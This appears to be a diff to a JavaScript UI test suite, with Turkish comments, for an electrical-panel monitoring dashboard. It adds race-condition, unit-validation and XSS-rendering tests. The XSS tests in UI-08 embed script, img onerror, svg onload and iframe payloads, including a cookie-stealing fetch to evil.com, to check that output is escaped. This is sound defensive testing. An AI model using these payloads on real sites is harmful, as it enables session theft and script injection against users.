@@ -16,18 +16,18 @@ class MockElement {
         this.className = '';
         this.classList = {
             add: (c) => {
-                const parts = this.className ? this.className.split(' ') : [];
+                const parts = this.className ? this.className.split(' ').filter(Boolean) : [];
                 if (!parts.includes(c)) parts.push(c);
                 this.className = parts.join(' ');
             },
             remove: (c) => {
-                const parts = this.className ? this.className.split(' ') : [];
+                const parts = this.className ? this.className.split(' ').filter(Boolean) : [];
                 this.className = parts.filter(x => x !== c).join(' ');
             },
             contains: (c) => (this.className ? this.className.split(' ').includes(c) : false)
         };
         this._textContent = undefined;
-        this.innerHTML = '';
+        this._innerHTML = undefined;
         this.children = [];
         this.parentNode = null;
         this.style = {};
@@ -36,6 +36,7 @@ class MockElement {
         this.value = '';
         this.width = 480;
         this.height = 360;
+        this.canvasCalls = [];
 
         if (id && global.document && global.document.registerElement) {
             global.document.registerElement(id, this);
@@ -60,13 +61,35 @@ class MockElement {
 
     set textContent(val) {
         this._textContent = String(val);
+        this._innerHTML = undefined;
         this.children = [];
+    }
+
+    get innerHTML() {
+        if (this._innerHTML !== undefined) return this._innerHTML;
+        if (this._textContent !== undefined) {
+            return this._textContent
+                .replace(/&/g, '&amp;')
+                .replace(/</g, '&lt;')
+                .replace(/>/g, '&gt;')
+                .replace(/"/g, '&quot;')
+                .replace(/'/g, '&#39;');
+        }
+        return this.children.map(c => c.innerHTML).join('');
+    }
+
+    set innerHTML(val) {
+        this._innerHTML = String(val);
+        if (val === '') {
+            this.children = [];
+        }
     }
 
     focus() {}
 
     appendChild(child) {
         this._textContent = undefined;
+        this._innerHTML = undefined;
         child.parentNode = this;
         this.children.push(child);
         return child;
@@ -92,6 +115,9 @@ class MockElement {
             if (selector.startsWith('#') && child.id === selector.slice(1)) {
                 return child;
             }
+            if (child.tagName.toLowerCase() === selector.toLowerCase()) {
+                return child;
+            }
             const found = child.querySelector(selector);
             if (found) return found;
         }
@@ -103,8 +129,9 @@ class MockElement {
         for (const child of this.children) {
             if (selector.startsWith('.') && child.className.split(' ').includes(selector.slice(1))) {
                 results.push(child);
-            }
-            if (selector.startsWith('#') && child.id === selector.slice(1)) {
+            } else if (selector.startsWith('#') && child.id === selector.slice(1)) {
+                results.push(child);
+            } else if (child.tagName.toLowerCase() === selector.toLowerCase()) {
                 results.push(child);
             }
             results.push(...child.querySelectorAll(selector));
@@ -130,16 +157,16 @@ class MockElement {
 
     getContext() {
         return {
-            fillRect: () => {},
-            clearRect: () => {},
-            beginPath: () => {},
-            arc: () => {},
-            fill: () => {},
-            stroke: () => {},
-            moveTo: () => {},
-            lineTo: () => {},
-            closePath: () => {},
-            fillText: () => {},
+            fillRect: (...args) => { this.canvasCalls.push({ type: 'fillRect', args }); },
+            clearRect: (...args) => { this.canvasCalls.push({ type: 'clearRect', args }); },
+            beginPath: () => { this.canvasCalls.push({ type: 'beginPath' }); },
+            arc: (...args) => { this.canvasCalls.push({ type: 'arc', args }); },
+            fill: () => { this.canvasCalls.push({ type: 'fill' }); },
+            stroke: () => { this.canvasCalls.push({ type: 'stroke' }); },
+            moveTo: (x, y) => { this.canvasCalls.push({ type: 'moveTo', x, y }); },
+            lineTo: (x, y) => { this.canvasCalls.push({ type: 'lineTo', x, y }); },
+            closePath: () => { this.canvasCalls.push({ type: 'closePath' }); },
+            fillText: (...args) => { this.canvasCalls.push({ type: 'fillText', args }); },
             save: () => {},
             restore: () => {},
             scale: () => {},
@@ -365,11 +392,16 @@ test('UI-01: Saha/pano/modül ağacı, boş pano ve modül cihaz durumu doğrula
     assert.equal(deviceBadge.textContent, 'CİHAZ: AKTİF', "Üst panelde AKTİF yazmalı");
 });
 
-test('UI-02: Modül seçimi yarış durumu (Race Condition) ve servis hatası izolasyonu', async () => {
+test('UI-02: Modül seçimi yarış durumu (Race Condition), termal kare sıfırlama ve servis hatası izolasyonu', async () => {
     setupMockEnvironment();
     const app = await loadApp();
 
-    // Senaryo: A seçilir, A'nın yanıtı 50ms gecikir. Hemen B seçilir, B 5ms'de döner.
+    // 1. Önceki modülden kalan termal karenin yeni modül seçildiğinde derhal temizlenmesi doğrulaması
+    app.state.termalMatris = new Float32Array(768).fill(48.5);
+    app.state.termalOzet = { min: 22, max: 48.5, ort: 31 };
+    app.state.termalKaynak = 'kanit';
+
+    // Senaryo: A seçilir, A'nın yanıtı 60ms gecikir. Hemen B seçilir, B 10ms'de döner.
     // A'nın geciken yanıtı B'nin ekranına yazılmamalıdır!
     global.fetch = async (url) => {
         if (url.includes('/moduller/MODUL-A')) {
@@ -406,6 +438,11 @@ test('UI-02: Modül seçimi yarış durumu (Race Condition) ve servis hatası iz
     const pA = app.modulDetayYukle('MODUL-A');
     const pB = app.modulDetayYukle('MODUL-B');
 
+    // B seçildiğinde hemen önceki modüle ait termal kare ve özet temizlenmiş olmalıdır
+    assert.equal(app.state.termalMatris, null, "Yeni modül seçildiği an önceki termal kare matrisi sıfırlanmalıdır");
+    assert.equal(app.state.termalOzet, null, "Yeni modül seçildiği an önceki termal özet sıfırlanmalıdır");
+    assert.equal(app.state.termalKaynak, 'canli', "Termal kaynak canlıya dönmelidir");
+
     await Promise.all([pA, pB]);
 
     // B seçili olduğu için ekranda A'ya ait 99.9 kalmamalı, B'nin 24.5 değeri olmalıdır
@@ -414,7 +451,8 @@ test('UI-02: Modül seçimi yarış durumu (Race Condition) ve servis hatası iz
     const badgeEl = document.getElementById('active-module-badge');
     assert.equal(badgeEl.textContent, 'MODUL-B', "Başlık MODUL-B olmalı");
 
-    // Servis hatası senaryosu: B'nin detay isteği 500 dönerse açık hata görünmeli, A'nın metrikleri görünmemeli
+    // Servis hatası senaryosu: C'nin detay isteği 500 dönerse açık hata görünmeli, önceki metrik ve termal silinmeli
+    app.state.termalMatris = new Float32Array(768).fill(30);
     global.fetch = async () => ({
         ok: false,
         status: 500,
@@ -425,12 +463,46 @@ test('UI-02: Modül seçimi yarış durumu (Race Condition) ve servis hatası iz
     const errBanner = document.getElementById('module-error-banner');
     assert.equal(errBanner.style.display, 'flex', "Hata bandı görünür olmalı");
     assert.equal(document.getElementById('val-temp').textContent, '--', "Hata anında önceki metrikler temizlenmeli");
+    assert.equal(app.state.termalMatris, null, "Hata anında termal matris de temizlenmeli");
 });
 
-test('UI-03: Canlı ölçüm kalitesi, eksik nötr/ark, null besleme ve faz dengesizliği', async () => {
+test('UI-03: Canlı ölçüm kalitesi, birim doğrulaması, eksik nötr/ark ve faz dengesizliği', async () => {
     setupMockEnvironment();
     const app = await loadApp();
 
+    // 1. Birim Doğrulama Fonksiyonu Birim Testleri
+    assert.equal(app.birimGecerliMi('ortam_sicaklik', 'C'), true, "C geçerli olmalı");
+    assert.equal(app.birimGecerliMi('ortam_sicaklik', '°C'), true, "°C geçerli olmalı");
+    assert.equal(app.birimGecerliMi('ortam_sicaklik', 'F'), false, "Fahrenheit reddedilmeli");
+    assert.equal(app.birimGecerliMi('ortam_sicaklik', 'Kelvin'), false, "Kelvin reddedilmeli");
+    assert.equal(app.birimGecerliMi('nem', '%'), true, "% nem için geçerli olmalı");
+    assert.equal(app.birimGecerliMi('nem', 'ppm'), false, "ppm nem için geçersiz olmalı");
+    assert.equal(app.birimGecerliMi('akim_l1', 'A'), true, "A akım için geçerli olmalı");
+    assert.equal(app.birimGecerliMi('akim_l1', 'V'), false, "Volt akım için reddedilmeli");
+    assert.equal(app.birimGecerliMi('ark_olay', 'adet'), true, "adet ark için geçerli olmalı");
+
+    // 2. Birim Uyumsuzluğu Senaryosu: Sıcaklık birimi 'F' geldiğinde değer reddedilmeli ve Birim Uyumsuz yazmalı
+    global.fetch = async () => ({
+        ok: true,
+        json: async () => ({
+            modul_id: 'M-BIRIM-TEST',
+            aktif: true,
+            besleme: 'sebeke',
+            sinyal: -65,
+            son_gorulme: '2026-09-19T12:00:00Z',
+            son_olcumler: [
+                { olcum_tipi: 'ortam_sicaklik', deger: 77.0, birim: 'F', kalite: 'iyi', zaman: '2026-09-19T12:00:00Z' }
+            ]
+        })
+    });
+
+    await app.modulDetayYukle('M-BIRIM-TEST');
+    const tempBirimVal = document.getElementById('val-temp');
+    assert.equal(tempBirimVal.textContent, '--', "Uyumsuz birimde değer gösterilmemeli (-- olmalı)");
+    const tempStatus = document.getElementById('temp-status');
+    assert.match(tempStatus.textContent, /Birim uyumsuz/, "Kart durumu 'Birim uyumsuz' uyarısı göstermeli");
+
+    // 3. Kalite, Bağımsız Zaman Damgası, null besleme ve 3-Faz Akım Doğrulaması
     global.fetch = async () => ({
         ok: true,
         json: async () => ({
@@ -440,11 +512,11 @@ test('UI-03: Canlı ölçüm kalitesi, eksik nötr/ark, null besleme ve faz deng
             sinyal: null,        // null sinyal
             son_gorulme: '2026-09-19T12:00:00Z',
             son_olcumler: [
-                { olcum_tipi: 'ortam_sicaklik', deger: 0.0, birim: 'C', kalite: 'iyi' }, // Gerçek 0
-                { olcum_tipi: 'nem', deger: 45.0, birim: '%', kalite: 'supheli' },      // Şüpheli kalite
-                { olcum_tipi: 'akim_l1', deger: 10.0, birim: 'A', kalite: 'iyi' },
-                { olcum_tipi: 'akim_l2', deger: 10.5, birim: 'A', kalite: 'supheli' },  // L2 şüpheli!
-                { olcum_tipi: 'akim_l3', deger: 10.2, birim: 'A', kalite: 'iyi' }
+                { olcum_tipi: 'ortam_sicaklik', deger: 0.0, birim: 'C', kalite: 'iyi', zaman: '2026-09-19T12:00:00Z' }, // Gerçek 0
+                { olcum_tipi: 'nem', deger: 45.0, birim: '%', kalite: 'supheli', zaman: '2026-09-19T12:02:30Z' },      // Farklı zaman & şüpheli kalite
+                { olcum_tipi: 'akim_l1', deger: 10.0, birim: 'A', kalite: 'iyi', zaman: '2026-09-19T12:00:00Z' },
+                { olcum_tipi: 'akim_l2', deger: 10.5, birim: 'A', kalite: 'supheli', zaman: '2026-09-19T12:00:00Z' },  // L2 şüpheli!
+                { olcum_tipi: 'akim_l3', deger: 10.2, birim: 'A', kalite: 'iyi', zaman: '2026-09-19T12:00:00Z' }
                 // akim_notr ve ark_olay EKSİK (dizide yok)
             ]
         })
@@ -452,30 +524,30 @@ test('UI-03: Canlı ölçüm kalitesi, eksik nötr/ark, null besleme ve faz deng
 
     await app.modulDetayYukle('M-KALITE-TEST');
 
-    // 1. besleme=null "BİLİNMİYOR" olmalı, "ŞEBEKE" olmamalı
+    // a. besleme=null "BİLİNMİYOR" olmalı, "ŞEBEKE" olmamalı
     const feedEl = document.getElementById('val-feed');
     assert.equal(feedEl.textContent, 'BİLİNMİYOR');
 
-    // 2. Gerçek 0 değeri gösterilmeli
+    // b. Gerçek 0 değeri gösterilmeli
     const tempEl = document.getElementById('val-temp');
     assert.equal(tempEl.textContent, '0.0');
 
-    // 3. Eksik nötr akımı ve ark sayacı kesinlikle '0' olmamalı, '--' olmalı
+    // c. Eksik nötr akımı ve ark sayacı kesinlikle '0' olmamalı, '--' olmalı
     const notrEl = document.getElementById('val-notr');
     const arcEl = document.getElementById('val-arc');
     assert.equal(notrEl.textContent, '--', 'Eksik nötr akımı -- olmalı');
     assert.equal(arcEl.textContent, '--', 'Eksik ark sayacı -- olmalı');
 
-    // 4. L2 şüpheli olduğundan faz dengesizliği hesaplanamamalı
+    // d. L2 şüpheli olduğundan faz dengesizliği hesaplanamamalı
     const diffEl = document.getElementById('current-diff');
     assert.equal(diffEl.textContent, 'Faz Dengesizliği: Hesaplanamadı', 'Şüpheli faz varken denge güvenilir hesaplanmamalı');
 
-    // 5. Şüpheli ölçüm uyarısı eklenmeli
+    // e. Şüpheli ölçüm uyarısı eklenmeli
     const humCard = document.getElementById('card-hum');
     assert.ok(humCard.querySelector('.card-quality-warning'), 'Şüpheli ölçüm kartında uyarı görünmeli');
 });
 
-test('UI-04: Gerçek 768 tam kare doğrulama, eksik/bozuk kare reddi ve piksel okuma', async () => {
+test('UI-04: Gerçek 768 tam kare doğrulama, geciken kanıt karesi yarış durumu (Race Condition) izolasyonu', async () => {
     setupMockEnvironment();
     const app = await loadApp();
 
@@ -527,6 +599,14 @@ test('UI-04: Gerçek 768 tam kare doğrulama, eksik/bozuk kare reddi ve piksel o
             seviye: 'uyari',
             skor: 0.85,
             kanit: { kare_id: 'KARE-1', piksel: [14, 9] }
+        },
+        {
+            id: 'ANOM-2',
+            modul_id: 'M1',
+            tip: 'termal_sicak_nokta',
+            seviye: 'kritik',
+            skor: 0.95,
+            kanit: { kare_id: 'KARE-2', piksel: [5, 5] }
         }
     ];
 
@@ -540,9 +620,61 @@ test('UI-04: Gerçek 768 tam kare doğrulama, eksik/bozuk kare reddi ve piksel o
     await app.anomaliSec('ANOM-1');
     const valTmax = document.getElementById('val-tmax');
     assert.equal(valTmax.textContent, '62.3', 'Sıcaklık skordan üretilmemeli, gerçek piksel sıcaklığı olmalı');
+
+    // 4. Yarış Durumu (Race Condition) Testi:
+    // Kullanıcı ANOM-1'i seçer (KARE-1 yanıtı 80ms gecikir).
+    // Kullanıcı hemen ANOM-2'yi seçer (KARE-2 yanıtı 10ms'de döner).
+    // Geciken KARE-1 yanıtı geldiğinde ANOM-2 ekranını EZMEMELİDİR!
+    const kare1 = {
+        satir_sayisi: 24,
+        sutun_sayisi: 32,
+        modul_id: 'M1',
+        zaman: '2026-09-19T12:00:00Z',
+        piksel_verisi: new Array(768).fill(40.0)
+    };
+    kare1.piksel_verisi[9 * 32 + 14] = 45.0;
+
+    const kare2 = {
+        satir_sayisi: 24,
+        sutun_sayisi: 32,
+        modul_id: 'M1',
+        zaman: '2026-09-19T12:01:00Z',
+        piksel_verisi: new Array(768).fill(70.0)
+    };
+    kare2.piksel_verisi[5 * 32 + 5] = 88.0;
+
+    global.fetch = async (url) => {
+        if (url.includes('/termal/kare/KARE-1')) {
+            await new Promise(r => setTimeout(r, 80));
+            return { ok: true, json: async () => kare1 };
+        }
+        if (url.includes('/termal/kare/KARE-2')) {
+            await new Promise(r => setTimeout(r, 10));
+            return { ok: true, json: async () => kare2 };
+        }
+        return { ok: false, status: 404 };
+    };
+
+    const pAnom1 = app.anomaliSec('ANOM-1');
+    const pAnom2 = app.anomaliSec('ANOM-2');
+    await Promise.all([pAnom1, pAnom2]);
+
+    assert.equal(app.state.seciliAnomaliId, 'ANOM-2', "Seçili anomali ANOM-2 kalmalı");
+    assert.equal(app.state.termalMatris[5 * 32 + 5], 88.0, "ANOM-2'nin piksel verisi aktif kalmalı");
+    assert.notEqual(app.state.termalMatris[9 * 32 + 14], 45.0, "Geciken ANOM-1 karesi ANOM-2 ekranını ezmemeli");
+
+    // 5. Canlı Görüntüye Dönüş Yarış Durumu Testi:
+    // Kullanıcı ANOM-1'i seçer (80ms gecikir), fakat hemen canliGoruntuyeDon() butonuna tıklar.
+    // Geciken kanıt karesi canlı termal modunu kanıt karesine çevirmemelidir!
+    const pAnomLate = app.anomaliSec('ANOM-1');
+    app.canliGoruntuyeDon();
+    await pAnomLate;
+
+    assert.equal(app.state.termalKaynak, 'canli', "Canlı moda dönüldükten sonra geciken kanıt karesi canlı modu ezmemelidir");
+    assert.equal(app.state.seciliAnomaliId, null, "Seçili anomali null kalmalıdır");
 });
 
-test('UI-05: 51 açık + 2 onaylı olayda 53 çözülmemiş olay taranması ve onay akışı', async () => {
+test('UI-05: 51 açık + 2 onaylı olayda 53 çözülmemiş olay taranması, hata izolasyonu ve onay akışı', async () => {
     setupMockEnvironment();
     const app = await loadApp();
 
@@ -655,11 +787,33 @@ test('UI-05: 51 açık + 2 onaylı olayda 53 çözülmemiş olay taranması ve o
         return { ok: true, json: async () => ({ veriler: [], sonraki: null }) };
     };
     await app.alarmOnayla('A-2', 'M1');
-    assert.equal(postCount, 1, '500 hatasında tek bir POST yapılmalı, sessizce fallback tekrarı yapılmamalı');
-    assert.ok(document.getElementById('alarm-card-A-2'), '500 hatasında kart silinmemeli');
+    // Servis Hatası (HTTP 500 / Ağ Hatası) Doğrulaması:
+    // Alarm servisi çöktüğünde "Sistem Stabil" DEĞİL, hata paneli görünmeli ve sayaç '--' olmalıdır!
+    global.fetch = async (url) => {
+        if (url.includes('/anomaliler')) {
+            return {
+                ok: false,
+                status: 500,
+                json: async () => ({ hata: { mesaj: "Veritabanı bağlantı hatası" } })
+            };
+        }
+        return { ok: false, status: 404 };
+    };
+
+    await app.alarmlariYukle();
+    const alarmsContainer = document.getElementById('alarms-container');
+    assert.doesNotMatch(alarmsContainer.innerHTML, /Sistem Stabil/, "Alarm servisi 500 dönerken 'Sistem Stabil' gösterilmemeli");
+    assert.match(alarmsContainer.innerHTML, /Alarm Servisi Hatası|bağlantı kurulamadı/, "Alarm servisi hata paneli gösterilmeli");
+    assert.equal(document.getElementById('active-alarm-count').textContent, '--', "Alarm servisi hata verdiğinde sayaç '--' olmalı");
+
+    // Ağ Hatası (fetch throwing exception) testi
+    global.fetch = async () => { throw new Error("Ağ bağlantısı koptu (NetworkError)"); };
+    await app.alarmlariYukle();
+    assert.doesNotMatch(alarmsContainer.innerHTML, /Sistem Stabil/, "Ağ hatasında da 'Sistem Stabil' gösterilmemeli");
+    assert.equal(document.getElementById('active-alarm-count').textContent, '--', "Ağ hatasında sayaç '--' olmalı");
 });
 
-test('UI-06: Zaman serisi ham ve kovalanmış noktalar, şüpheli işaretleme ve izolasyon', async () => {
+test('UI-06: Zaman serisi gerçek zaman aralıklı çizim, boşluk (gap) yönetimi ve izolasyon', async () => {
     setupMockEnvironment();
     const app = await loadApp();
 
@@ -759,9 +913,55 @@ test('UI-06: Zaman serisi ham ve kovalanmış noktalar, şüpheli işaretleme ve
     await app.zamanSerisiYukle();
     assert.ok(cagirilanTipler.includes('akim_l1') && cagirilanTipler.includes('akim_l2') && cagirilanTipler.includes('akim_l3'), '3-Faz akımları için L1, L2 ve L3 birlikte çekilmeli');
     assert.ok(app.state.seriCokluVeri && app.state.seriCokluVeri.l1 && app.state.seriCokluVeri.l2 && app.state.seriCokluVeri.l3, 'seriCokluVeri nesnesi L1, L2, L3 verileriyle doldurulmalı');
+
+    // 6. Gerçek Zaman Aralıklarına Göre Orantılı Çizim Doğrulaması:
+    // 3 nokta: t0=0s, t1=60s (+1dk), t2=600s (+10dk toplam süre).
+    // İndeks bazlı çizilseydi t1 ekranın %50'sinde olurdu.
+    // Gerçek zaman aralıklı çizimde t1, 60/600 = %10 konumunda olmalıdır!
+    const canvas = document.getElementById('timeseriesCanvas');
+    canvas.canvasCalls = [];
+
+    const zamanOranNoktalari = [
+        { zaman: '2026-09-19T10:00:00.000Z', deger: 20.0, kalite: 'iyi' },
+        { zaman: '2026-09-19T10:01:00.000Z', deger: 25.0, kalite: 'iyi' },
+        { zaman: '2026-09-19T10:10:00.000Z', deger: 30.0, kalite: 'iyi' }
+    ];
+
+    app.state.seriNoktalar = zamanOranNoktalari;
+    app.state.seriBasZamanMs = null;
+    app.state.seriBitZamanMs = null;
+    app.zamanSerisiCizGenel(zamanOranNoktalari, 'ortam_sicaklik', null, null);
+
+    assert.ok(app.state.aktifSeriCizimVerisi, "Çizim verisi oluşturulmuş olmalı");
+    const pts = app.state.aktifSeriCizimVerisi.points;
+    assert.equal(pts.length, 3, "3 nokta çizilmiş olmalı");
+    const x0 = pts[0].screenX;
+    const x1 = pts[1].screenX;
+    const x2 = pts[2].screenX;
+    const oran = (x1 - x0) / (x2 - x0);
+    assert.ok(Math.abs(oran - 0.10) < 0.05, `t1 noktası zamana orantılı olarak ~%10 konumunda olmalı (ölçülen: ${oran.toFixed(3)})`);
+
+    // 7. Kesintili Veride Boşluk (Gap) Yönetimi Doğrulaması:
+    // Arasında 40 dakika (2400 saniye) boşluk olan ölçümler sahte düz çizgiyle birleştirilmemeli, moveTo ile kırılmalıdır.
+    canvas.canvasCalls = [];
+    const kesintiliNoktalar = [
+        { zaman: '2026-09-19T10:00:00.000Z', deger: 20.0, kalite: 'iyi' },
+        { zaman: '2026-09-19T10:00:10.000Z', deger: 20.5, kalite: 'iyi' },
+        { zaman: '2026-09-19T10:00:20.000Z', deger: 20.8, kalite: 'iyi' },
+        // 40 dakika kesinti!
+        { zaman: '2026-09-19T10:40:20.000Z', deger: 28.0, kalite: 'iyi' },
+        { zaman: '2026-09-19T10:40:30.000Z', deger: 28.2, kalite: 'iyi' }
+    ];
+
+    app.zamanSerisiCizGenel(kesintiliNoktalar, 'ortam_sicaklik', null, null);
+
+    const gapPts = app.state.aktifSeriCizimVerisi.points;
+    const p3 = gapPts[3];
+    const p3Move = canvas.canvasCalls.find(c => c.type === 'moveTo' && Math.abs(c.x - p3.screenX) < 1 && Math.abs(c.y - p3.screenY) < 1);
+    assert.ok(p3Move, "Zaman boşluğu sonrası nokta için moveTo çağrılarak çizgi kesilmelidir");
 });
 
-test('UI-07: Operasyon günlüğü artan sıradan en büyük son 30 geçişin alınması ve 61 numaralı geçiş', async () => {
+test('UI-07: Operasyon günlüğü artan sıradan en büyük son 30 geçişin alınması ve tek yenilemede >50 yeni geçiş', async () => {
     setupMockEnvironment();
     const app = await loadApp();
 
@@ -807,7 +1007,7 @@ test('UI-07: Operasyon günlüğü artan sıradan en büyük son 30 geçişin al
                         veriler: [
                             { id: 61, anomali_id: 'ANOM-61', zaman: '2026-09-19T10:05:00Z', alan: 'durum', yeni: 'onaylandi', aktor: 'op_61' }
                         ],
-                        sonraki: 61,
+                        sonraki: null,
                         limit: 50
                     })
                 };
@@ -829,6 +1029,53 @@ test('UI-07: Operasyon günlüğü artan sıradan en büyük son 30 geçişin al
     assert.equal(app.state.gecisler[0].id, 32, '61 sonrası ilk gösterilen 32 olmalı');
     assert.equal(app.state.gecisler[29].id, 61, '61 sonrası son gösterilen 61 olmalı');
 
+    // TEK BİR YENİLEMEDE 50'DEN FAZLA YENİ GEÇİŞ (65 yeni kayıt: 62..126) SENARYOSU:
+    // İlk sayfa 50 kayıt (62..111, sonraki: 111), ikinci sayfa 15 kayıt (112..126, sonraki: null).
+    // Kod tek sayfayla yetinmeyip iki sayfayı da çekmeli ve 126'ya kadar olan son 30 kaydı göstermelidir!
+    const yeni65Gecis = Array.from({ length: 65 }, (_, i) => ({
+        id: 62 + i,
+        anomali_id: `ANOM-${62 + i}`,
+        zaman: '2026-09-19T10:10:00Z',
+        alan: 'durum',
+        yeni: 'onaylandi',
+        aktor: 'operator_bulk'
+    }));
+
+    let sayfaSayisi = 0;
+    global.fetch = async (url) => {
+        if (url.includes('/gecisler?sonra=61')) {
+            sayfaSayisi++;
+            return {
+                ok: true,
+                json: async () => ({
+                    veriler: yeni65Gecis.slice(0, 50),
+                    sonraki: 111,
+                    limit: 50
+                })
+            };
+        }
+        if (url.includes('/gecisler?sonra=111')) {
+            sayfaSayisi++;
+            return {
+                ok: true,
+                json: async () => ({
+                    veriler: yeni65Gecis.slice(50),
+                    sonraki: null,
+                    limit: 50
+                })
+            };
+        }
+        return { ok: false, status: 404 };
+    };
+
+    await app.operasyonGunluguYukle();
+
+    assert.equal(sayfaSayisi, 2, "50'den fazla yeni kayıt için sonraki sayfalar da çekilmelidir");
+    assert.equal(app.state.gecisler.length, 30, "Maksimum 30 geçiş tutulmalı");
+    assert.equal(app.state.gecisler[0].id, 97, "97..126 arasındaki son 30 kaydın ilki 97 olmalıdır");
+    assert.equal(app.state.gecisler[29].id, 126, "Son kayıt 126 olmalıdır");
+    assert.equal(app.state.sonGecisId, 126, "Son geçiş ID 126 olmalıdır");
+
     // Günlük isteği hata verirse eski liste korunmalı ve hata bildirilmeli
     global.fetch = async () => ({ ok: false, status: 500 });
     await app.operasyonGunluguYukle();
@@ -836,10 +1083,11 @@ test('UI-07: Operasyon günlüğü artan sıradan en büyük son 30 geçişin al
     assert.equal(app.state.gecisler.length, 30, 'Eski liste korunmalı');
 });
 
-test('UI-08: HTML enjeksiyonu ve XSS koruması doğrulaması', async () => {
+test('UI-08: HTML enjeksiyonu, XSS koruması ve gerçek DOM render doğrulaması', async () => {
     setupMockEnvironment();
     const app = await loadApp();
 
+    // 1. escapeHtml fonksiyonu birim testleri
     const zararliGerekce = '<script>alert("xss")</script><img src=x onerror=alert(1)>';
     const guvenli = app.escapeHtml(zararliGerekce);
 
@@ -847,8 +1095,114 @@ test('UI-08: HTML enjeksiyonu ve XSS koruması doğrulaması', async () => {
     assert.doesNotMatch(guvenli, /<img/, 'Img etiketi kaçışlanmalı');
     assert.match(guvenli, /&lt;script&gt;/, 'Güvenli HTML formatında olmalı');
 
-    // Tek tırnaklı modul_id testi
-    const tirnakliId = "MODUL'--DROP";
+    const tirnakliId = "MODUL'--DROP\"<test>";
     const kacisliTirnak = app.escapeHtml(tirnakliId);
     assert.match(kacisliTirnak, /&#39;/, 'Tek tırnak kaçışlanmalı');
+    assert.match(kacisliTirnak, /&quot;/, 'Çift tırnak kaçışlanmalı');
+
+    // 2. Ağaç Görünümü (hiyerarsiyiYukle) Gerçek DOM Enjeksiyon Testi:
+    // Saha adı, pano adı ve modül kimliğinde XSS yükleri yer aldığında DOM'a çalıştırılabilir script/img girmemelidir
+    global.fetch = async (url) => {
+        if (url.includes('/sahalar')) {
+            return {
+                ok: true,
+                json: async () => ({
+                    sahalar: [{
+                        saha_kodu: '<script>alert("saha_xss")</script>',
+                        ad: '<img src=x onerror=alert("saha_img")>',
+                        panolar: [{
+                            pano_kodu: '<iframe src=javascript:alert("pano")></iframe>',
+                            ad: '<b>Kalın Pano</b>',
+                            moduller: [{
+                                modul_id: '<b onmouseover=alert(1)>MOD-XSS</b>',
+                                aktif: true,
+                                seviye: 'normal'
+                            }]
+                        }]
+                    }]
+                })
+            };
+        }
+        if (url.includes('/moduller')) {
+            return {
+                ok: true,
+                json: async () => ({ veriler: [], ofset: 0, toplam: 0, limit: 50 })
+            };
+        }
+        return { ok: false, status: 404 };
+    };
+
+    await app.hiyerarsiyiYukle();
+    const treeContainer = document.getElementById('hierarchy-container');
+    assert.doesNotMatch(treeContainer.innerHTML, /<script\b/i, "Ağaç renderında <script> etiketi çalışabilir halde bulunmamalıdır");
+    assert.doesNotMatch(treeContainer.innerHTML, /<img\s/i, "Ağaç renderında <img> etiketi bulunmamalıdır");
+    assert.doesNotMatch(treeContainer.innerHTML, /<iframe\b/i, "Ağaç renderında <iframe> bulunmamalıdır");
+    assert.match(treeContainer.innerHTML, /&lt;script&gt;/, "Script zararlısı kaçışlı entity olmalı");
+    assert.match(treeContainer.innerHTML, /&lt;img/, "Img zararlısı kaçışlı entity olmalı");
+
+    // 3. Alarm Kartları (alarmlariYukle) Gerçek DOM Enjeksiyon Testi:
+    // Anomali gerekçesi veya modül ID zararlı HTML içerdiğinde textContent veya kaçış ile güvenli basılmalıdır
+    const xssAnomali = [{
+        id: '<script>alert("anom_id")</script>',
+        modul_id: '<img src=x onerror=alert("modul_id")>',
+        sira: 1,
+        seviye: 'kritik',
+        durum: 'acik',
+        tip: 'termal_sicak_nokta',
+        gerekce: '<svg onload=alert("gerekce_xss")><a href="javascript:alert(1)">Tıkla</a>'
+    }];
+
+    global.fetch = async (url) => {
+        if (url.includes('/anomaliler?durum=acik')) {
+            return {
+                ok: true,
+                json: async () => ({ veriler: xssAnomali, sonraki: null, limit: 50 })
+            };
+        }
+        if (url.includes('/anomaliler?durum=onaylandi')) {
+            return {
+                ok: true,
+                json: async () => ({ veriler: [], sonraki: null, limit: 50 })
+            };
+        }
+        return { ok: false, status: 404 };
+    };
+
+    await app.alarmlariYukle();
+    const alarmsContainer = document.getElementById('alarms-container');
+    assert.doesNotMatch(alarmsContainer.innerHTML, /<svg\b/i, "Alarm kartı renderında <svg> etiketi bulunmamalıdır");
+    assert.doesNotMatch(alarmsContainer.innerHTML, /<script\b/i, "Alarm kartı renderında <script> etiketi bulunmamalıdır");
+    assert.doesNotMatch(alarmsContainer.innerHTML, /<a\s/i, "Alarm kartı renderında <a> etiketi bulunmamalıdır");
+    assert.match(alarmsContainer.innerHTML, /&lt;svg/, "Svg etiketi kaçışlı basılmalıdır");
+
+    // 4. Operasyon Günlüğü (operasyonGunluguYukle) Gerçek DOM Enjeksiyon Testi:
+    // Aktor ve alanlarda XSS yükleri yer aldığında audit-container içine kaçışlı basılmalıdır
+    app.state.sonGecisId = null;
+    app.state.gecisler = [];
+    global.fetch = async (url) => {
+        if (url.includes('/gecisler')) {
+            return {
+                ok: true,
+                json: async () => ({
+                    veriler: [{
+                        id: 1,
+                        anomali_id: '<img src=x onerror=alert("audit_anom")>',
+                        zaman: '2026-09-19T10:00:00Z',
+                        alan: 'durum',
+                        yeni: 'onaylandi',
+                        aktor: '<script>fetch("http://evil.com/steal?cookie="+document.cookie)</script>'
+                    }],
+                    sonraki: null,
+                    limit: 50
+                })
+            };
+        }
+        return { ok: false, status: 404 };
+    };
+
+    await app.operasyonGunluguYukle();
+    const auditContainer = document.getElementById('audit-container');
+    assert.doesNotMatch(auditContainer.innerHTML, /<script\b/i, "Operasyon günlüğü renderında <script> bulunmamalıdır");
+    assert.doesNotMatch(auditContainer.innerHTML, /<img\s/i, "Operasyon günlüğü renderında <img> bulunmamalıdır");
+    assert.match(auditContainer.innerHTML, /&lt;script&gt;/, "Operasyon günlüğü renderında kaçışlı HTML entity olmalıdır");
 });
